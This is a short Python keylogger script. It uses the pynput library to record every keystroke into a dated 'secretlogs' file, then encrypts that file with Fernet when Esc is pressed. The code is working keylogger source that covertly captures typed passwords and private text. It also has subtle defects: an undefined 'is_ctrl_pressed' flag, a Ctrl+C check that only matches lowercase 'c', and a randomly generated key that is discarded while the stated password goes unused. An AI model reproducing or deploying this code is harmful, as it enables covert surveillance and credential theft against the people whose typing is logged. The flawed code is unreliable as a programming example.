from cryptography.fernet import Fernet
from pynput import keyboard
import sys
import os
import datetime

current_date = datetime.date.today()
date_string = current_date.strftime("%Y-%m-%d")


# Usage example
file_path = f"secretlogs_{date_string}.txt"
password = b"p4ssw0rdp4ssw0rdp4ssw0rd"


file = open(file_path, "w")

def onPress(key):
    #print(str(key))
    stroke = str(key).replace("'", "")
    if str(key) == "Key.space":
        file.write(" ")
    elif str(key) == "Key.enter":
        file.write("\n")
    elif str(key) == "Key.esc":
        file.write(" ")
    elif key == keyboard.KeyCode.from_char('c' or 'C') and is_ctrl_pressed:
        file.write(" ")
    elif str(key) == "Key.backspace":
        file.seek(file.tell()-1, os.SEEK_SET)
        file.write("")
    else:
      file.write(stroke)

def encrypt_file(file_path, password):
    # Generate a key from the password
    key = Fernet.generate_key()

    # Create a Fernet cipher object with the key
    cipher = Fernet(key)

    # Read the file content
    with open(file_path, "rb") as file:
        file_content = file.read()

    # Encrypt the file content
    encrypted_content = cipher.encrypt(file_content)

    # Write the encrypted content back to the file
    encrypted_file_path = file_path + ".encrypted"
    with open(encrypted_file_path, "wb") as encrypted_file:
        encrypted_file.write(encrypted_content)

    print(f"File encrypted and saved as: {encrypted_file_path}")

def onRelease(key):
    if str(key) == "Key.esc":
        file.close()
        encrypt_file(file_path, password)
        sys.exit(0)

if __name__ == "__main__":
    with keyboard.Listener(on_press=onPress, on_release=onRelease) as listener:
        listener.join()
        
